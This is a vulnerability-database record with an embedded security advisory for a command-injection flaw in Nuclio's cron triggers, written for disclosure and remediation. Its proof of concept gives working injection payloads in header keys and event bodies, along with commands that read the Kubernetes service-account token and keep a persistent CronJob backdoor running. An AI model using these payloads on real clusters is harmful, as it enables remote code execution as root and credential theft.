@@ -1,0 +1,591 @@
+[id]
+ave_id = "AVE-2026-0389"
+aliases = ["CVE-2026-52831","GHSA-v5px-423j-pf7p"]
+
+[basic]
+title = "Nuclio: Unsanitized cron trigger event headers/body injected into CronJob shell command leads to persistent RCE"
+description = "## Summary
+
+Nuclio controller builds a `curl` invocation string for each cron trigger and stores it as the `args` of a Kubernetes CronJob container (`/bin/sh`, `-c`, `<command>`). Two fields in the trigger specification flow into this string without adequate sanitization:
+
+- `event.headers` keys — interpolated verbatim inside double-quoted `--header` arguments (`lazy.go:2150`); any key containing `\"` breaks the quoting context.
+- `event.body` — processed with `strconv.Quote`, which escapes `\"` and `\` but not `$()`, allowing command substitution (`lazy.go:2188`).
+
+Both paths were dynamically verified on Nuclio 1.15.27 (latest as of 2026-05-17).
+
+- **CVSS 3.1**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` — **9.9 (Critical)**
+- **CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
+- **Affected versions**: Nuclio <= 1.15.27 (latest, dynamically verified)
+
+---
+
+## Details
+
+### Root Cause
+
+When a NuclioFunction with a `cron` trigger is reconciled by the controller, it calls `generateCronTriggerCronJobSpec` in `pkg/platform/kube/functionres/lazy.go:2113`. This function builds a shell command string by concatenating user-supplied values and passes it directly to `/bin/sh -c`.
+
+**Path-A — Header key injection (`lazy.go:2146-2151`)**
+
+```go
+// lazy.go:2146-2151
+headersAsCurlArg := \"\"
+for headerKey := range attributes.Event.Headers {
+    headerValue := attributes.Event.GetHeaderString(headerKey)
+    headersAsCurlArg = fmt.Sprintf(\"%s --header \\"%s: %s\\"\",
+        headersAsCurlArg, headerKey, headerValue)
+    //                              ↑
+    //                   headerKey is user-controlled; no escaping applied
+}
+```
+
+`headerKey` is taken from `event.headers` in the trigger specification. Since it is interpolated directly inside a double-quoted shell argument, a key containing `\"` terminates the quoting context. The remainder of the key is then interpreted as raw shell syntax.
+
+Attack string for `headerKey`:
+```
+X-Inject\"; ARBITRARY_COMMAND; echo \"
+```
+
+Resulting shell command fragment:
+```bash
+--header \"X-Inject\"; ARBITRARY_COMMAND; echo \": value\"
+```
+
+**Path-B — Body command substitution (`lazy.go:2173-2192`)**
+
+```go
+// lazy.go:2188-2192
+curlCommand = fmt.Sprintf(\"echo %s > %s && %s %s\",
+    strconv.Quote(eventBody),   // escapes \" → \\" and \ → \\, but NOT $()
+    eventBodyFilePath,
+    curlCommand,
+    eventBodyCurlArg)
+```
+
+`strconv.Quote` wraps the string in double quotes and escapes `\"` and `\`, but does not escape `$`, `(`, or `)`. A body value of `$(CMD)` becomes the Go string `\"$(CMD)\"`, which the shell expands as command substitution when executing the `/bin/sh -c` string.
+
+Attack string for `event.body`:
+```
+$(ARBITRARY_COMMAND)
+```
+
+Resulting shell command:
+```bash
+echo \"$(ARBITRARY_COMMAND)\" > /tmp/eventbody.out && curl ...
+```
+
+**Execution sink (`lazy.go:2212`)**
+
+```go
+// lazy.go:2212
+Args: []string{\"/bin/sh\", \"-c\", curlCommand}
+```
+
+The entire concatenated string — including any injected content — is executed by the shell.
+
+**Persistence mechanism**
+
+The CronJob created by the controller carries no `ownerReferences` linking it to the NuclioFunction. Kubernetes cascade deletion only applies to owned resources. If the controller crashes between function deletion and explicit CronJob deletion, the CronJob continues executing on its schedule indefinitely. The controller code itself acknowledges this at `lazy.go:522`:
+
+```go
+// Delete function k8s CronJobs before the Deployment so they cannot spawn new
+// CronJobs are not owned by the Deployment, so cascade does not remove them.
+```
+
+---
+
+## PoC
+
+### Environment Setup
+
+The following steps reproduce the vulnerability in an isolated local environment.
+
+**Step 1 — Install prerequisites**
+
+```bash
+# kind (Kubernetes-in-Docker)
+curl -Lo /usr/local/bin/kind \
+    https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
+chmod +x /usr/local/bin/kind
+
+# Helm
+curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
+```
+
+**Step 2 — Create isolated kind cluster**
+
+```bash
+kind create cluster --name vul-010
+kubectl cluster-info --context kind-vul-010
+```
+
+Expected output:
+```
+Kubernetes control plane is running at https://127.0.0.1:xxxxx
+```
+
+**Step 3 — Deploy Nuclio (latest 1.15.27)**
+
+```bash
+helm repo add nuclio https://nuclio.github.io/nuclio/charts
+helm repo update
+
+kubectl create namespace nuclio
+
+helm install nuclio nuclio/nuclio \
+    --namespace nuclio \
+    --kube-context kind-vul-010 \
+    --version 0.21.27 \
+    --set dashboard.enabled=true \
+    --set controller.enabled=true
+```
+
+Wait for the controller to become ready:
+```bash
+kubectl wait --for=condition=Available deployment/nuclio-controller \
+    -n nuclio --context kind-vul-010 --timeout=120s
+```
+
+**Step 4 — Create a NuclioProject**
+
+```bash
+kubectl apply --context kind-vul-010 -f - <<'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioProject
+metadata:
+  name: default
+  namespace: nuclio
+spec:
+  description: \"default project\"
+EOF
+```
+
+**Step 5 — Prepare a placeholder image for the function deployment**
+
+The controller needs a non-empty image field to create the function Deployment. Load any small image that is already present on the host:
+
+```bash
+# Tag alpine as the placeholder function image
+docker tag gcr.io/iguazio/alpine:3.20 placeholder-function:latest
+kind load docker-image placeholder-function:latest --name vul-010
+
+# Also load the CronJob runner image (appropriate/curl or any sh-capable image)
+docker tag gcr.io/iguazio/alpine:3.20 appropriate/curl:latest
+kind load docker-image appropriate/curl:latest --name vul-010
+```
+
+---
+
+### Exploitation — Path-A: Header Key Injection
+
+**Step 6 — Create a NuclioFunction with malicious header key**
+
+The injection payload in the header key is:
+```
+X-Inject\"; echo \"===RCE_CONFIRMED===\"; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo \"
+```
+
+```bash
+kubectl apply --context kind-vul-010 -f - <<'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioFunction
+metadata:
+  name: vul010-rce-visible
+  namespace: nuclio
+  labels:
+    nuclio.io/project-name: default
+spec:
+  image: placeholder-function:latest
+  runtime: python:3.9
+  handler: main:handler
+  build:
+    functionSourceCode: \"ZGVmIGhhbmRsZXIoY29udGV4dCwgZXZlbnQpOgogICAgcmV0dXJuICdoZWxsbyc=\"
+  triggers:
+    cron-inject:
+      kind: cron
+      attributes:
+        schedule: \"*/1 * * * *\"
+        event:
+          headers:
+            X-Normal: safe-value
+            'X-Inject\"; echo \"===RCE_CONFIRMED===\"; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo \"': marker
+  minReplicas: 1
+  maxReplicas: 1
+EOF
+```
+
+**Step 7 — Trigger the controller to create the CronJob**
+
+```bash
+kubectl patch nucliofunction vul010-rce-visible -n nuclio \
+    --context kind-vul-010 \
+    --type=merge \
+    -p '{\"status\":{\"state\":\"waitingForResourceConfiguration\"}}'
+```
+
+Wait ~10 seconds for the controller to reconcile, then list CronJobs:
+```bash
+kubectl get cronjob -n nuclio --context kind-vul-010
+```
+
+Expected output:
+```
+NAME                                   SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE
+nuclio-cron-job-d84tg6lmuaqc73arn15g   */1 * * * *   False     0        <none>          12s
+```
+
+**Step 8 — Inspect the generated CronJob command (static confirmation)**
+
+```bash
+CJ_NAME=$(kubectl get cronjob -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.items[0].metadata.name}')
+
+kubectl get cronjob \"$CJ_NAME\" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.spec.jobTemplate.spec.template.spec.containers[0].args}' \
+    | python3 -m json.tool
+```
+
+Actual output from verification:
+```json
+[
+    \"/bin/sh\",
+    \"-c\",
+    \"curl --silent  --header \\"X-Inject\\"; echo \\"===RCE_CONFIRMED===\\"; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo \\": marker\\" --header \\"X-Normal: safe-value\\" --header \\"X-Nuclio-Invoke-Trigger: cron\\" --header \\"X-Nuclio-Target: vul010-rce-visible\\" nuclio-vul010-rce-visible.nuclio.svc.cluster.local:8080 --retry 10 --retry-delay 1 --retry-max-time 10 --retry-connrefused\"
+]
+```
+
+The injected commands are clearly embedded between the shell-separated statements.
+
+**Step 9 — Manually trigger a CronJob run (dynamic confirmation)**
+
+```bash
+kubectl create job --from=cronjob/\"$CJ_NAME\" \
+    vul010-rce-proof -n nuclio --context kind-vul-010
+
+# Wait for the pod to complete
+kubectl wait pod -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-rce-proof \
+    --for=condition=Ready --timeout=30s 2>/dev/null || true
+
+POD=$(kubectl get pods -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-rce-proof -o jsonpath='{.items[0].metadata.name}')
+
+kubectl logs \"$POD\" -n nuclio --context kind-vul-010
+```
+
+Actual pod log output from verification:
+```
+/bin/sh: curl: not found
+===RCE_CONFIRMED===
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+eyJhbGciOiJSUzI1NiIsImtpZCI6InNtaUE1WS0yVXl2ZUhsTG: marker --header X-Normal: safe-value ...
+```
+
+- Line 1: `curl` exits immediately at `\"X-Inject\"` (no curl binary in alpine)
+- Line 2: `echo \"===RCE_CONFIRMED===\"` executes — injection confirmed
+- Line 3: `id` executes — container runs as `uid=0 (root)`
+- Line 4: `cat .../token | head -c 50` exfiltrates the first 50 bytes of the K8s SA token
+
+---
+
+### Exploitation — Path-B: Body Command Substitution
+
+**Step 10 — Create a NuclioFunction with malicious event body**
+
+```bash
+kubectl apply --context kind-vul-010 -f - <<'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioFunction
+metadata:
+  name: vul010-body-inject
+  namespace: nuclio
+  labels:
+    nuclio.io/project-name: default
+spec:
+  image: placeholder-function:latest
+  runtime: python:3.9
+  handler: main:handler
+  build:
+    functionSourceCode: \"ZGVmIGhhbmRsZXIoY29udGV4dCwgZXZlbnQpOgogICAgcmV0dXJuICdoZWxsbyc=\"
+  triggers:
+    cron-body:
+      kind: cron
+      attributes:
+        schedule: \"*/1 * * * *\"
+        event:
+          body: \"$(id 1>&2; echo BODY_INJECTION_PROOF)\"
+  minReplicas: 1
+  maxReplicas: 1
+EOF
+
+kubectl patch nucliofunction vul010-body-inject -n nuclio \
+    --context kind-vul-010 \
+    --type=merge \
+    -p '{\"status\":{\"state\":\"waitingForResourceConfiguration\"}}'
+```
+
+**Step 11 — Verify CronJob command (static)**
+
+```bash
+sleep 15
+CJ_NAME_B=$(kubectl get cronjob -n nuclio --context kind-vul-010 \
+    -l \"nuclio.io/function-name=vul010-body-inject\" \
+    -o jsonpath='{.items[0].metadata.name}')
+
+kubectl get cronjob \"$CJ_NAME_B\" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.spec.jobTemplate.spec.template.spec.containers[0].args}' \
+    | python3 -m json.tool
+```
+
+Actual output from verification:
+```json
+[
+    \"/bin/sh\",
+    \"-c\",
+    \"echo \\"$(id 1>&2; echo BODY_INJECTION_PROOF)\\" > /tmp/eventbody.out && curl --silent  --header \\"X-Nuclio-Invoke-Trigger: cron\\" --header \\"X-Nuclio-Target: vul010-body-inject\\" nuclio-vul010-body-inject.nuclio.svc.cluster.local:8080 ...\"
+]
+```
+
+`$()` is present unescaped inside a double-quoted string passed to `/bin/sh -c`.
+
+**Step 12 — Dynamic execution**
+
+```bash
+kubectl create job --from=cronjob/\"$CJ_NAME_B\" \
+    vul010-body-proof -n nuclio --context kind-vul-010
+
+POD_B=$(kubectl get pods -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-body-proof -o jsonpath='{.items[0].metadata.name}')
+
+kubectl logs \"$POD_B\" -n nuclio --context kind-vul-010
+```
+
+Actual pod log output from verification:
+```
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/bin/sh: curl: not found
+```
+
+`id` ran as root via `$()` expansion before `curl` was even attempted.
+
+---
+
+### Persistence Verification
+
+**Step 13 — Confirm CronJob has no ownerReferences**
+
+```bash
+kubectl get cronjob \"$CJ_NAME\" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.metadata.ownerReferences}'
+```
+
+Expected: empty (no output)
+
+**Step 14 — Simulate controller crash during function deletion**
+
+```bash
+# Stop the controller
+kubectl scale deployment nuclio-controller -n nuclio \
+    --context kind-vul-010 --replicas=0
+
+# Delete the function
+kubectl delete nucliofunction vul010-rce-visible -n nuclio \
+    --context kind-vul-010
+
+sleep 5
+
+# Function is gone — CronJob remains
+kubectl get nucliofunction -n nuclio --context kind-vul-010
+kubectl get cronjob -n nuclio --context kind-vul-010
+```
+
+Actual output from verification:
+```
+# NuclioFunctions:
+NAME                  AGE
+vul010-body-inject2   2m30s
+(vul010-rce-visible deleted — not listed)
+
+# CronJobs:
+NAME                                   SCHEDULE      SUSPEND   ACTIVE
+nuclio-cron-job-d84tj8lmuaqc73arn170   */1 * * * *   False     0
+(CronJob belonging to the deleted function — still running)
+```
+
+**Step 15 — Execute the persistent backdoor**
+
+```bash
+kubectl create job --from=cronjob/nuclio-cron-job-d84tj8lmuaqc73arn170 \
+    vul010-persist-backdoor -n nuclio --context kind-vul-010
+
+kubectl logs vul010-persist-backdoor-* -n nuclio --context kind-vul-010
+```
+
+Actual pod log output from verification:
+```
+/bin/sh: curl: not found
+PERSISTENT_BACKDOOR_ACTIVE
+: attacker-value --header X-Nuclio-Invoke-Trigger: cron --header X-Nuclio-Target: vul010-persist-test ...
+```
+
+The injected command executes after the source function has been deleted.
+
+---
+
+### Cleanup
+
+```bash
+kubectl delete nucliofunction --all -n nuclio --context kind-vul-010 2>/dev/null
+kubectl delete cronjob --all -n nuclio --context kind-vul-010 2>/dev/null
+kind delete cluster --name vul-010
+```
+
+---
+
+## Impact
+
+**Remote Code Execution**: An attacker with network access to the Dashboard API (unauthenticated by default) can execute arbitrary shell commands inside the CronJob pod on every scheduled tick.
+
+**Runs as root**: Every CronJob pod confirmed running as `uid=0(root)` during verification.
+
+**ServiceAccount token exfiltration**: The pod's mounted SA token (`/var/run/secrets/ kubernetes.io/serviceaccount/token`) is readable by the injected commands and can be exfiltrated to an attacker-controlled host via the injected `curl` call. This token enables:
+- Enumeration of Kubernetes API resources in the `nuclio` namespace
+- In misconfigured clusters, cluster-wide API access
+
+**Persistent backdoor**: The CronJob resource has no `ownerReferences` and is not garbage-collected by Kubernetes. In the window between controller unavailability and explicit cleanup, the CronJob continues executing the attacker's commands on the configured schedule (minimum every 1 minute) — persisting beyond function deletion, Nuclio redeployments, or loss of attacker Dashboard access.
+
+**Cloud environment lateral movement**: In managed Kubernetes environments (AWS EKS, GCP GKE, Azure AKS), the injected commands can access the cloud instance metadata service to retrieve IAM credentials, enabling lateral movement outside the cluster.
+
+---
+
+## Severity
+
+**Critical — CVSS 3.1 Score: 9.9**
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+```
+
+| Metric | Value | Rationale |
+|---|---|---|
+| Attack Vector | Network | Dashboard is network-accessible |
+| Attack Complexity | Low | No preconditions; straightforward payload |
+| Privileges Required | None | NOP auth is the default configuration |
+| User Interaction | None | Fully automated via API |
+| Scope | Changed | Impact crosses pod boundary into cluster |
+| Confidentiality | High | SA token, secrets readable |
+| Integrity | High | Arbitrary command execution as root |
+| Availability | High | Persistent CronJob can exhaust cluster resources |
+
+---
+
+## Affected Versions
+
+All Nuclio versions that support Kubernetes CronJob-based cron triggers, which includes the current production release.
+
+- **Confirmed affected**: 1.15.27 (latest as of 2026-05-17, dynamically verified)
+- **Earliest affected**: introduced when CronJob-based cron trigger support was added (cronTriggerCreationMode: kube)
+
+---
+
+## Patched Versions
+
+https://github.com/nuclio/nuclio/releases/tag/1.16.4
+
+---
+
+## Workarounds
+
+1. **Network-level restriction**: Place the Nuclio Dashboard behind an authenticated
+   reverse proxy or restrict port 8070 to trusted networks only. This limits who can
+   submit function specifications.
+
+2. **Disable cron triggers**: If cron trigger functionality is not required, avoid creating
+   functions with `kind: cron` triggers.
+
+3. **RBAC restriction**: Remove the `batch` API group permission from the Nuclio controller
+   ServiceAccount to prevent CronJob creation. Note: this disables cron trigger
+   functionality entirely.
+
+None of the above eliminate the root cause; they only reduce exposure.
+
+---
+
+## Resources
+
+- Vulnerable file: `pkg/platform/kube/functionres/lazy.go`
+  - Path-A: line 2150 — header key interpolation
+  - Path-B: lines 2188-2189 — body interpolation with `strconv.Quote`
+  - Execution sink: line 2212 — `Args: []string{\"/bin/sh\", \"-c\", curlCommand}`
+- Go `strconv.Quote` documentation: does not escape `$`, `(`, `)`, or backticks
+- CWE-78: Improper Neutralization of Special Elements used in an OS Command
+- CVSS 3.1 Calculator: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
+
+---
+
+## Remediation
+
+**P0 — Eliminate the shell layer (preferred fix)**
+
+Replace the `/bin/sh -c <string>` invocation with an exec-format argument list. This
+removes shell interpretation entirely:
+
+```go
+// Current (vulnerable): lazy.go:2212
+Args: []string{\"/bin/sh\", \"-c\", curlCommand}
+
+// Fixed: build curl args as a []string slice
+func buildCurlArgs(headers map[string]string, body, address string) []string {
+    args := []string{\"curl\", \"--silent\"}
+    for k, v := range headers {
+        args = append(args, \"--header\", k+\": \"+v)
+    }
+    if body != \"\" {
+        args = append(args, \"--data\", body)
+    }
+    args = append(args, \"--retry\", \"10\", \"--retry-delay\", \"1\",
+        \"--retry-max-time\", \"10\", \"--retry-connrefused\", address)
+    return args
+}
+
+// Container spec:
+Container{
+    Command: nil,
+    Args:    buildCurlArgs(headersMap, eventBody, functionAddress),
+}
+```
+
+With exec format, each argument is passed directly to the process without shell
+interpretation. No quoting or escaping is needed.
+
+**P1 — Shell-safe quoting (fallback if shell is required)**
+
+If the shell invocation must be retained, apply proper POSIX shell quoting to all
+user-supplied values before interpolation. The equivalent of Python's `shlex.quote`
+must be implemented in Go:
+
+```go
+func shellQuote(s string) string {
+    return \"'\" + strings.ReplaceAll(s, \"'\", \"'\\''\") + \"'\"
+}
+```
+
+Apply to both `headerKey`, `headerValue`, and `eventBody` before inserting into the
+command string."
+severity = "CRITICAL"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-24T03:28:03.975489924+00:00"
